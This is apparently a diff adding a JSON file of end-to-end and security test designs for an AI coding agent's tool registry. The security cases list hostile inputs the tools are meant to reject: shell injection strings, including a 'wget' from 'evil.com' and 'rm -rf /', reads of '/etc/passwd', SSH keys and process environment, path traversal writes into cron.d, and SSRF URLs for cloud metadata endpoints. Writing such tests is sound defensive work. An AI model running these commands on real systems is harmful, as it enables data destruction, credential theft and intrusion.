@@ -1,0 +1,607 @@
+{
+  "$schema": "https://tasks.opencode.dev/schema",
+  "version": "1.0",
+  "module": "tool",
+  "description": "E2E test case designs for opencode-tools crate - Tool implementations and registry",
+  "test_cases": [
+    {
+      "id": "tool_e2e_001",
+      "status": "not_started",
+      "title": "ToolRegistry registration and lookup",
+      "description": "Test registering tools and looking them up by name",
+      "modules": ["tool"],
+      "steps": [
+        "Create empty ToolRegistry",
+        "Register ReadTool, WriteTool, BashTool",
+        "Lookup 'read' tool - verify exists",
+        "Lookup 'nonexistent' tool - verify not found",
+        "Call list_tools() and verify count"
+      ],
+      "expected_outcomes": [
+        "Tools registered with correct names",
+        "Lookup returns correct tool instance",
+        "Nonexistent lookup returns error"
+      ]
+    },
+    {
+      "id": "tool_e2e_002",
+      "status": "not_started",
+      "title": "ReadTool file reading with schema validation",
+      "description": "Test ReadTool executes correctly with valid arguments",
+      "modules": ["tool", "file"],
+      "steps": [
+        "Create temp file with content 'hello world'",
+        "Execute ReadTool with {path: temp_file_path}",
+        "Verify ToolResult.success = true",
+        "Verify content matches file content"
+      ],
+      "expected_outcomes": [
+        "File content correctly read and returned",
+        "Tool handles non-existent files gracefully with error"
+      ]
+    },
+    {
+      "id": "tool_e2e_003",
+      "status": "not_started",
+      "title": "WriteTool file creation and overwrite protection",
+      "description": "Test WriteTool creates files and handles existing files",
+      "modules": ["tool", "file"],
+      "steps": [
+        "Execute WriteTool to create new file",
+        "Verify file exists with correct content",
+        "Execute WriteTool again to same file",
+        "Verify overwrite behavior matches config"
+      ],
+      "expected_outcomes": [
+        "File created with correct content",
+        "Overwrite behavior configurable"
+      ]
+    },
+    {
+      "id": "tool_e2e_004",
+      "status": "not_started",
+      "title": "BashTool command execution with timeout",
+      "description": "Test BashTool executes commands and respects timeout",
+      "modules": ["tool", "shell"],
+      "steps": [
+        "Execute BashTool with 'echo hello' - verify success",
+        "Execute BashTool with 'sleep 100' and 1s timeout",
+        "Verify timeout error returned",
+        "Execute BashTool with 'exit 1' - verify error"
+      ],
+      "expected_outcomes": [
+        "Valid commands execute successfully",
+        "Timeout causes ToolResult.error",
+        "Non-zero exit codes produce errors"
+      ]
+    },
+    {
+      "id": "tool_e2e_005",
+      "status": "not_started",
+      "title": "GrepTool pattern search",
+      "description": "Test GrepTool finds patterns in files",
+      "modules": ["tool"],
+      "steps": [
+        "Create files with various content",
+        "Execute GrepTool with regex pattern",
+        "Verify matches returned with file paths and line numbers",
+        "Execute with no matches - verify empty result"
+      ],
+      "expected_outcomes": [
+        "Matching lines returned with context",
+        "Empty result for no matches"
+      ]
+    },
+    {
+      "id": "tool_e2e_006",
+      "status": "not_started",
+      "title": "MultiEditTool atomic multi-file edits",
+      "description": "Test MultiEditTool applies multiple edits atomically",
+      "modules": ["tool", "file"],
+      "steps": [
+        "Prepare edits to 3 different files",
+        "Execute MultiEditTool with all edits",
+        "Verify all files modified correctly",
+        "If one edit fails, verify no files changed"
+      ],
+      "expected_outcomes": [
+        "All edits applied on success",
+        "Atomic rollback on partial failure"
+      ]
+    },
+    {
+      "id": "tool_e2e_007",
+      "status": "not_started",
+      "title": "GlobTool pattern matching",
+      "description": "Test GlobTool finds files by pattern",
+      "modules": ["tool"],
+      "steps": [
+        "Create files: src/main.rs, src/lib.rs, tests/main.rs",
+        "Execute GlobTool with '**/*.rs'",
+        "Verify all .rs files returned",
+        "Execute with 'src/**/*' - verify only src files"
+      ],
+      "expected_outcomes": [
+        "Pattern matching works correctly",
+        "Results are deduplicated"
+      ]
+    },
+    {
+      "id": "tool_e2e_008",
+      "status": "not_started",
+      "title": "LspTool code navigation",
+      "description": "Test LspTool provides go-to-definition and find-references",
+      "modules": ["tool", "lsp"],
+      "steps": [
+        "Start LSP server for Rust project",
+        "Execute LspTool with goto_definition",
+        "Verify location returned",
+        "Execute LspTool with find_references",
+        "Verify references returned"
+      ],
+      "expected_outcomes": [
+        "Definition location returned",
+        "References found correctly"
+      ]
+    },
+    {
+      "id": "tool_e2e_009",
+      "status": "not_started",
+      "title": "WebFetchTool URL content retrieval",
+      "description": "Test WebFetchTool fetches web content",
+      "modules": ["tool"],
+      "steps": [
+        "Execute WebFetchTool with http://example.com",
+        "Verify ToolResult.success = true",
+        "Verify content contains expected text",
+        "Execute with invalid URL - verify error"
+      ],
+      "expected_outcomes": [
+        "Valid URLs fetched successfully",
+        "Invalid URLs handled gracefully"
+      ]
+    },
+    {
+      "id": "tool_e2e_010",
+      "status": "not_started",
+      "title": "Tool safety classification",
+      "description": "Test is_safe() returns correct values per tool",
+      "modules": ["tool"],
+      "steps": [
+        "Verify ReadTool.is_safe() = true",
+        "Verify WriteTool.is_safe() = false",
+        "Verify BashTool.is_safe() = false",
+        "Verify GlobTool.is_safe() = true"
+      ],
+      "expected_outcomes": [
+        "Read-only tools marked safe",
+        "Write/execute tools marked unsafe"
+      ]
+    },
+    {
+      "id": "tool_sec_001",
+      "status": "not_started",
+      "title": "BashTool shell injection prevention",
+      "description": "CRITICAL: BashTool must reject commands with shell injection payloads. RCE risk if bypassed.",
+      "modules": ["tool", "shell"],
+      "risk_addressed": "Remote code execution via untrusted input in bash tool",
+      "preconditions": "ToolRegistry with BashTool registered, permission scope ReadOnly",
+      "test_data": [
+        {"payload": "; rm -rf /", "expected": "rejected"},
+        {"payload": "$(whoami)", "expected": "rejected"},
+        {"payload": "`id`", "expected": "rejected"},
+        {"payload": "&& cat /etc/passwd", "expected": "rejected"},
+        {"payload": "|| wget http://evil.com/shell.sh", "expected": "rejected"},
+        {"payload": "newline\\nwhoami", "expected": "rejected"},
+        {"payload": "var=value; whoami", "expected": "rejected"},
+        {"payload": "$(cat /proc/self/environ)", "expected": "rejected"},
+        {"payload": "| cat /etc/passwd", "expected": "rejected"},
+        {"payload": "touch /tmp/pwned && echo pwned", "expected": "rejected"},
+        {"payload": "a' OR '1'='1", "expected": "rejected"},
+        {"payload": "echo $SHELL", "expected": "rejected"},
+        {"payload": "cd / && ls", "expected": "rejected"}
+      ],
+      "steps": [
+        "For each injection payload, execute BashTool with payload",
+        "Verify ToolResult.error contains rejection indicator",
+        "Verify no command was actually executed server-side"
+      ],
+      "expected_outcomes": [
+        "All injection attempts rejected with error",
+        "Command string not passed to shell unchanged",
+        "Exit code never 0 for rejected commands",
+        "Error message does not reveal shell behavior"
+      ],
+      "post_checks": [
+        "System files unchanged (/etc/passwd, /tmp, etc.)",
+        "Tool returns error, not panic",
+        "Tool remains registered and functional for legitimate commands",
+        "Legitimate command 'echo hello' still works"
+      ],
+      "priority": "critical"
+    },
+    {
+      "id": "tool_sec_002",
+      "status": "not_started",
+      "title": "BashTool path traversal prevention",
+      "description": "BashTool must reject commands attempting to access files outside allowed scope",
+      "modules": ["tool", "shell"],
+      "risk_addressed": "Access files outside allowed workspace scope",
+      "preconditions": "ToolRegistry with BashTool registered, workspace root is /tmp/opencode_test",
+      "test_data": [
+        "../../../etc/passwd",
+        "/absolute/path/to/secret",
+        "..\\..\\..\\windows\\system32\\config",
+        "read file.txt; cat /proc/self/environ",
+        "cat /home/user/.ssh/id_rsa",
+        "cat /var/log/syslog"
+      ],
+      "steps": [
+        "For each path traversal attempt, execute BashTool",
+        "Verify rejection"
+      ],
+      "expected_outcomes": [
+        "Path traversal attempts blocked",
+        "Tool returns error without accessing files",
+        "No file content returned for traversal attempts"
+      ],
+      "post_checks": [
+        "Tool still functional for legitimate commands",
+        "Commands within workspace still work"
+      ],
+      "priority": "critical"
+    },
+    {
+      "id": "tool_sec_003",
+      "status": "not_started",
+      "title": "WebFetchTool SSRF prevention",
+      "description": "CRITICAL: WebFetchTool must reject requests to internal/sensitive addresses. SSRF risk.",
+      "modules": ["tool"],
+      "risk_addressed": "Server-side request forgery to internal infrastructure",
+      "preconditions": "ToolRegistry with WebFetchTool registered",
+      "test_data": [
+        {"url": "http://169.254.169.254/latest/meta-data/", "description": "AWS metadata"},
+        {"url": "http://localhost/admin", "description": "localhost"},
+        {"url": "http://127.0.0.1:22", "description": "localhost with port"},
+        {"url": "http://10.0.0.1/internal/api", "description": "private IP range"},
+        {"url": "http://192.168.1.1/router-config", "description": "private IP router"},
+        {"url": "http://[::1]:8080/", "description": "IPv6 localhost"},
+        {"url": "http://metadata.google.internal/computeMetadata/v1/", "description": "GCP metadata"},
+        {"url": "http://169.254.0.0/16", "description": "link-local range"},
+        {"url": "http://0.0.0.0/", "description": "bind to all interfaces"}
+      ],
+      "steps": [
+        "For each internal/SSRF target URL, execute WebFetchTool",
+        "Verify ToolResult.error returned",
+        "Verify no network request was made to the target"
+      ],
+      "expected_outcomes": [
+        "All internal IP ranges rejected",
+        "Link-local addresses (169.254.x.x) rejected",
+        "Localhost variants rejected (127.x.x.x, ::1)",
+        "Metadata endpoints rejected",
+        "0.0.0.0 rejected"
+      ],
+      "post_checks": [
+        "Tool still functional for legitimate public URLs",
+        "Tool returns correct data for public URLs like http://example.com"
+      ],
+      "priority": "critical"
+    },
+    {
+      "id": "tool_sec_004",
+      "status": "not_started",
+      "title": "ReadTool symlink and special file handling",
+      "description": "CRITICAL: ReadTool must not follow symlinks or read special files outside workspace scope",
+      "modules": ["tool", "file"],
+      "risk_addressed": "Sandbox escape via symlink or reading sensitive special files",
+      "preconditions": "Workspace root is /tmp/opencode_test",
+      "test_data": [
+        {"path": "link_to_etc_passwd", "target": "/etc/passwd", "type": "symlink"},
+        {"path": "link_to_home", "target": "/home", "type": "symlink"},
+        {"path": "link_to_outside", "target": "/var", "type": "symlink"},
+        {"path": "/dev/null", "type": "device"},
+        {"path": "/dev/urandom", "type": "device"},
+        {"path": "fifo_pipe", "type": "named_pipe"},
+        {"path": "/proc/self/environ", "type": "proc_file"}
+      ],
+      "steps": [
+        "Create workspace with symlinks to sensitive paths",
+        "Create device files and FIFOs in workspace",
+        "Attempt to read each path via ReadTool",
+        "Verify error returned for each"
+      ],
+      "expected_outcomes": [
+        "Symlink resolution returns error OR points within workspace",
+        "Device files return error 'not a regular file'",
+        "FIFOs return error or timeout",
+        "No sensitive file content returned",
+        "/proc files return error"
+      ],
+      "post_checks": [
+        "Workspace remains clean",
+        "ReadTool still works for regular files within workspace"
+      ],
+      "priority": "critical"
+    },
+    {
+      "id": "tool_sec_005",
+      "status": "not_started",
+      "title": "BashTool signal handling during execution",
+      "description": "BashTool must handle signals (SIGINT, SIGTERM) during long-running commands",
+      "modules": ["tool", "shell"],
+      "risk_addressed": "Zombie processes or hung tool execution after signal",
+      "preconditions": "ToolRegistry with BashTool registered",
+      "test_data": ["sleep 60", "yes | head -n 1000000"],
+      "steps": [
+        "Execute BashTool with 'sleep 60' and 1s timeout",
+        "Verify command is killed after timeout",
+        "Execute 'yes | head' with 1s timeout",
+        "Verify command tree is killed (yes process also terminated)"
+      ],
+      "expected_outcomes": [
+        "Timeout kills the process group, not just parent",
+        "No zombie processes remain",
+        "Tool returns timeout error, not hangs"
+      ],
+      "post_checks": [
+        "ToolRegistry still functional after timeout",
+        "Subsequent tool executions work correctly"
+      ],
+      "priority": "high"
+    },
+    {
+      "id": "tool_sec_006",
+      "status": "not_started",
+      "title": "WriteTool path traversal and overwrite protection",
+      "description": "WriteTool must prevent writing outside workspace and handle dangerous overwrites",
+      "modules": ["tool", "file"],
+      "risk_addressed": "Path traversal write, overwriting system files",
+      "preconditions": "Workspace root is /tmp/opencode_test",
+      "test_data": [
+        {"path": "../../../etc/cron.d/malware", "content": "malicious"},
+        {"path": "/tmp/outside_workspace.txt", "content": "test"},
+        {"path": "symlink_to_etc", "target": "/etc/passwd", "content": "pwned"},
+        {"path": "readonly_file", "content": "cannot write"}
+      ],
+      "steps": [
+        "Attempt to write to path outside workspace",
+        "Attempt to write through symlink to /etc",
+        "Create readonly file, attempt overwrite",
+        "Attempt to write to non-existent directory path"
+      ],
+      "expected_outcomes": [
+        "Paths outside workspace rejected",
+        "Symlink-to-etc writes rejected",
+        "Readonly file overwrite returns error",
+        "Non-existent directory path returns descriptive error"
+      ],
+      "post_checks": [
+        "/etc/passwd unchanged",
+        "Workspace contains only expected files",
+        "WriteTool still functional for valid paths"
+      ],
+      "priority": "critical"
+    },
+    {
+      "id": "tool_edge_001",
+      "status": "not_started",
+      "title": "ReadTool oversized file handling",
+      "description": "ReadTool must handle oversized files without memory exhaustion",
+      "modules": ["tool", "file"],
+      "risk_addressed": "Memory exhaustion via reading huge file",
+      "preconditions": "ToolRegistry with ReadTool registered",
+      "steps": [
+        "Create file larger than reasonable limit (e.g., 1GB)",
+        "Execute ReadTool on huge file",
+        "Verify error returned (file too large)",
+        "Verify process memory does not spike"
+      ],
+      "expected_outcomes": [
+        "Tool returns error for oversized file",
+        "Error message indicates size limit",
+        "Process does not OOM or crash"
+      ],
+      "post_checks": [
+        "Tool remains functional for normal-sized files",
+        "Memory usage is bounded"
+      ],
+      "priority": "high"
+    },
+    {
+      "id": "tool_edge_002",
+      "status": "not_started",
+      "title": "GrepTool catastrophic backtracking prevention",
+      "description": "GrepTool must prevent regex catastrophic backtracking (ReDoS)",
+      "modules": ["tool"],
+      "risk_addressed": "Denial of service via malicious regex",
+      "preconditions": "ToolRegistry with GrepTool registered",
+      "test_data": [
+        "(a+)+$ on 'aaaaaaaaaaaaaaaaaaX',  # exponential backtrack
+        "(a|a?)+$ on 'aaaaaaaaaaaaaaaaaaX',  # quadratic
+        "([a-zA-Z0-9]){100}$ on long input"  # polynomial
+      ],
+      "steps": [
+        "Execute GrepTool with ReDoS-prone regex on large input",
+        "Set a timeout for the operation",
+        "Verify timeout fires before regex consumes all CPU"
+      ],
+      "expected_outcomes": [
+        "Regex evaluation cancelled after timeout",
+        "Tool returns timeout error, not hangs indefinitely",
+        "Process does not consume 100% CPU for >5 seconds"
+      ],
+      "post_checks": [
+        "Tool still functional with normal regexes",
+        "Normal regexes complete quickly"
+      ],
+      "priority": "high"
+    },
+    {
+      "id": "tool_edge_003",
+      "status": "not_started",
+      "title": "GlobTool symlink loop prevention",
+      "description": "GlobTool must detect and prevent infinite loops from symlink cycles",
+      "modules": ["tool", "file"],
+      "risk_addressed": "Infinite loop when globbing directory with symlink cycles",
+      "preconditions": "ToolRegistry with GlobTool registered",
+      "steps": [
+        "Create directory structure with symlink cycle: dir/ -> dir/",
+        "Execute GlobTool with 'dir/**/*'",
+        "Set a timeout",
+        "Verify glob terminates (not infinite loop)"
+      ],
+      "expected_outcomes": [
+        "Glob terminates after timeout",
+        "No infinite loop",
+        "Error or partial results returned"
+      ],
+      "post_checks": [
+        "Tool still functional after cycle detection",
+        "No file descriptors leaked"
+      ],
+      "priority": "high"
+    },
+    {
+      "id": "tool_edge_004",
+      "status": "not_started",
+      "title": "BashTool empty and whitespace-only commands",
+      "description": "BashTool must handle empty commands, whitespace, and special shell builtins",
+      "modules": ["tool", "shell"],
+      "test_data": [
+        {"cmd": "", "expected": "error or safe handling"},
+        {"cmd": "   ", "expected": "error or safe handling"},
+        {"cmd": "true", "expected": "success"},
+        {"cmd": "false", "expected": "error"},
+        {"cmd": "exit 0", "expected": "success"},
+        {"cmd": "exit 42", "expected": "error with code 42"},
+        {"cmd": "export X=1 && echo $X", "expected": "safe, outputs 1"}
+      ],
+      "steps": [
+        "For each test case, execute BashTool",
+        "Verify expected outcome"
+      ],
+      "expected_outcomes": [
+        "Empty/whitespace commands handled safely",
+        "Shell builtins work correctly",
+        "Exit codes propagated correctly"
+      ],
+      "priority": "medium"
+    },
+    {
+      "id": "tool_multi_001",
+      "status": "not_started",
+      "title": "MultiEditTool partial failure atomicity",
+      "description": "When MultiEditTool partially fails, verify ALL changes are rolled back",
+      "modules": ["tool", "file"],
+      "risk_addressed": "Partial write leaving files in inconsistent state",
+      "preconditions": "ToolRegistry with MultiEditTool registered, 3 files prepared",
+      "steps": [
+        "Prepare edits to 3 files with valid content",
+        "Modify one file to have read-only permissions",
+        "Execute MultiEditTool with all 3 edits",
+        "Verify error returned for the blocked edit",
+        "Verify the other 2 files are UNCHANGED (rolled back)"
+      ],
+      "expected_outcomes": [
+        "Error returned for the failed edit",
+        "Other files NOT modified (rolled back atomically)",
+        "No partial state left behind"
+      ],
+      "post_checks": [
+        "All 3 files have original content",
+        "MultiEditTool still functional for new edits"
+      ],
+      "priority": "high"
+    },
+    {
+      "id": "tool_multi_002",
+      "status": "not_started",
+      "title": "MultiEditTool concurrent execution",
+      "description": "Two MultiEditTool executions on overlapping files must not corrupt each other",
+      "modules": ["tool", "file"],
+      "risk_addressed": "Concurrent writes to same file causing data corruption",
+      "preconditions": "ToolRegistry with MultiEditTool registered",
+      "steps": [
+        "Create file shared.txt with initial content",
+        "Execute MultiEditTool A: append 'A' to shared.txt",
+        "Execute MultiEditTool B: append 'B' to shared.txt simultaneously",
+        "Wait for both to complete",
+        "Verify content is either 'AB' or 'BA', not corruption like 'AAB'"
+      ],
+      "expected_outcomes": [
+        "One edit completes before the other (no interleaving)",
+        "Final content is deterministic based on order",
+        "No partial writes visible"
+      ],
+      "post_checks": [
+        "File is in valid state",
+        "No data loss"
+      ],
+      "priority": "high"
+    },
+    {
+      "id": "tool_registry_001",
+      "status": "not_started",
+      "title": "ToolRegistry handles duplicate registration gracefully",
+      "description": "Registering the same tool twice must not panic or leak",
+      "modules": ["tool"],
+      "steps": [
+        "Create empty ToolRegistry",
+        "Register ReadTool",
+        "Register ReadTool again (same name)",
+        "Verify no panic",
+        "Verify lookup still works"
+      ],
+      "expected_outcomes": [
+        "Duplicate registration handled gracefully",
+        "Last registration wins OR error returned",
+        "Tool remains accessible"
+      ],
+      "priority": "medium"
+    },
+    {
+      "id": "tool_registry_002",
+      "status": "not_started",
+      "title": "ToolRegistry unregister and reregister",
+      "description": "Tools can be removed and re-added to registry",
+      "modules": ["tool"],
+      "steps": [
+        "Register ReadTool",
+        "Unregister 'read'",
+        "Verify lookup returns error",
+        "Re-register ReadTool",
+        "Verify lookup works again"
+      ],
+      "expected_outcomes": [
+        "Unregister removes tool from registry",
+        "Re-register restores tool",
+        "No stale state in registry"
+      ],
+      "priority": "medium"
+    }
+  ],
+  "test_metadata": {
+    "module": "tool",
+    "crate": "opencode-tools",
+    "source": "crates/tools/src/lib.rs",
+    "total_cases": 24,
+    "category": "core",
+    "critical_invariants": [
+      "BashTool blocks shell injection",
+      "WebFetchTool blocks SSRF",
+      "ReadTool blocks symlink escape",
+      "WriteTool blocks path traversal",
+      "MultiEditTool is atomic"
+    ],
+    "high_risk_scenarios": [
+      "tool_sec_001: Shell injection RCE",
+      "tool_sec_003: SSRF to internal infrastructure",
+      "tool_sec_004: ReadTool symlink sandbox escape",
+      "tool_sec_006: WriteTool path traversal",
+      "tool_edge_001: ReadTool memory exhaustion",
+      "tool_edge_002: GrepTool ReDoS",
+      "tool_multi_001: MultiEditTool partial failure corruption"
+    ]
+  }
+}
